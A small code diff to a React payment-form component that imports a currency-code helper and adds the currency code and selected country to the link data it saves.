@@ -8,7 +8,7 @@ import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getCountryByCode } from "@/lib/countries";
 import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
-import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { ArrowLeft, User, Mail, Phone, CreditCard, Hash } from "lucide-react";
@@ -89,7 +89,9 @@ const PaymentData = () => {
           selected_service: selectedService,
           selected_service_name: selectedServiceData?.nameAr || selectedService,
           payment_amount: parseFloat(paymentAmount) || amount,
+          currency_code: getCurrencyCode(countryCode),
         },
+        selectedCountry: countryCode,
       };
 
       await updateLink.mutateAsync({
